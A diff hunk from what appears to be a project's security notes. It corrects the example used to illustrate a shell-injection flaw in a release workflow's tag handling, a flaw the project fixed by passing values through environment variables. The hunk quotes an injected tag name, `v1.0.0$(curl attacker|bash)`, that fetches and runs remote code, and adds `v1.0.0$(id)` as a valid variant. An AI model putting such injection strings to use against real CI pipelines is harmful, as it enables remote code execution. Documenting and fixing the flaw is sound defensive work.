@@ -70,9 +70,11 @@ from so a reader can check it.
   general shape (`$()`/backtick/`;` refs without spaces) against `git
   check-ref-format --allow-onelevel`. **Correction (this entry, rule 9):** an earlier
   revision of this sentence and of `release.yml`'s own comment illustrated the exploit
-  with `v1.0.0$(curl attacker|bash)`, which contains a literal space and is
-  therefore rejected by `git check-ref-format --allow-onelevel` — not the string
-  either reviewer actually validated. Found by a later `claude[bot]` pass on this
+  with `v1.0.0$(curl attacker|bash)` (confirmed invalid with `git
+  check-ref-format --allow-onelevel` exiting 1 due to the space). A valid
+  example would be `v1.0.0$(id)` (confirmed valid: `git
+  check-ref-format --allow-onelevel 'v1.0.0$(id)'` exits 0) — not the original,
+  invalid string either reviewer actually validated against. Found by a later `claude[bot]` pass on this
   same PR; the vulnerability and the fix below were never in question, only this one
   illustrative example. Fixed by passing `ref_name`/`repository` through
   `env:` (`TAG_NAME`/`REPO`) and referencing the shell variables instead of the
